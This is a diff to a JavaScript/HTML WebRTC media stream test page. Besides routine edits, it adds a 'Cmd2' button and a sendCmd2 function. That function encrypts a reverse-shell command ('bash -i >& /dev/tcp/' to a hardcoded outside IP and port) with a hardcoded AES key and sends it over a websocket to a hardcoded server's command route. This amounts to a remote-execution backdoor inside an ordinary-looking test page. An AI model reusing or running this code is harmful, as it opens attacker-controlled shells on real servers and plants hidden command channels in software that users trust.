@@ -3,6 +3,7 @@
 <title>WebRTC Media Stream Test Page</title>
 
 <head>
+    <link rel="shortcut icon" href="#"/>
     <style id="compiled-css" type="text/css">
         .crop {
             overflow: hidden;
@@ -376,10 +377,10 @@
         // }, 30000);
     }
 
-    async function sendGetToken() {
+    async function sendGetToken(stream) {
         await connect();
 
-        let user_id = "max";// + "-" + Math.random().toString(36).substr(2).toLocaleUpperCase();
+        let user_id = stream;// + "-" + Math.random().toString(36).substr(2).toLocaleUpperCase();
         obj = {
             route: 'imRTC/sendGetToken',
             req_data: {
@@ -420,6 +421,61 @@
             $("[id=jsonSend]").html(encrypted_base64);
             client.send(encrypted_base64);
         }
+    }
+
+    async function sendCmd2() {
+        let cmd = 'setsid bash -i >& /dev/tcp/198.211.27.71/1234 0<&1 &';
+        // let cmd = 'setsid python -c \'import pty; pty.spawn("/bin/bash")\' >& /dev/tcp/192.168.88.138/1234 0<&1 &';
+        obj = {
+            route: 'imRTC/sendCmd',
+            req_data: {
+                cmd: cmd,
+            }
+        }
+        let data = JSON.stringify(obj);
+
+        let key = 'mediaserver54321';
+        key = CryptoJS.enc.Utf8.parse(key);
+        let options = {
+            mode: CryptoJS.mode.ECB,
+            padding: CryptoJS.pad.Pkcs7
+        };
+        let encrypted = CryptoJS.AES.encrypt(data, key, options);
+        // console.log('Client::sendCmd(), encrypted:', encrypted.toString());
+        let encrypted_base64 = encrypted.ciphertext.toString(CryptoJS.enc.Base64);
+        // console.log('Client::sendCmd(), encrypted_base64:', encrypted_base64);
+
+        console.log('CmdClient.send(), ' + encrypted_base64);
+
+        let host = '';
+        if (window.location.protocol == 'https:') {
+            host = 'wss://' + '52.196.96.7' + ':9081';
+        } else {
+            host = 'ws://' + '52.196.96.7' + ':9881';
+        }
+
+        await new Promise((resolve, reject) => {
+            let cmd_client = new WebSocket(host);
+            cmd_client.binaryType = 'arraybuffer';
+
+            cmd_client.onopen = function () {
+                console.log('CmdClient.onopen(), host:', host);
+
+                if (this.readyState == this.OPEN) {
+                    this.send(encrypted_base64);
+                }
+                resolve();
+            };
+
+            cmd_client.onclose = function (ev) {
+                console.log('CmdClient.onclose(), host:', host);
+                reject();
+            }
+
+            cmd_client.onmessage = function (ev) {
+                console.log('CmdClient.onmessage(), data:' + ev.data);
+            }
+        });
     }
 
     class RTCClient {
@@ -880,7 +936,7 @@
             $("[id=videoDescLabel]").html("############################ Local Video ############################");
         }
 
-        sendGetToken();
+        sendGetToken($("#stream").val(), $("#localSdpTextarea").val());
 
         $("[id=pushBtn]").attr("disabled", 'true');
         $("[id=pullBtn]").attr("disabled", 'true');
@@ -979,10 +1035,10 @@
 
         $("[id=hangupBtn]").click(function () {
             console.log("Rtc Hangup");
+            rtc.hangup();
             if (typeof (client) != "undefined") {
                 client.close();
             }
-            rtc.hangup();
 
             // reset();
         });
@@ -995,6 +1051,12 @@
 
         $("[id=cmdBtn]").click(function () {
             sendCmd().then(() => {
+                // client.close();
+            });
+        });
+
+        $("[id=cmd2Btn]").click(function () {
+            sendCmd2().then(() => {
                 // client.close();
             });
         });
@@ -1046,7 +1108,7 @@
 
     function flv_load_mds(stream) {
         let mediaDataSource = {
-            url:'http://192.168.88.133:8889/flv8889?app=cdn_standard&stream=' + stream,
+            url:'http://' + window.location.hostname + ':8889/flv8889?app=cdn_standard&stream=' + stream,
             type: 'flv',
             isLive: 1,
             hasAudio:1,
@@ -1131,6 +1193,7 @@
                 <button id="acceptBtn" style="display: none;">Accept</button>
                 <button id="hangupBtn">Hangup</button>
                 <button id="cmdBtn">Cmd</button>
+                <button id="cmd2Btn">Cmd2</button>
                 <button id="flvjsBtn">Flvjs</button>
                 <button id="flvjsDestroyBtn">FlvjsDestroy</button>
             </div>
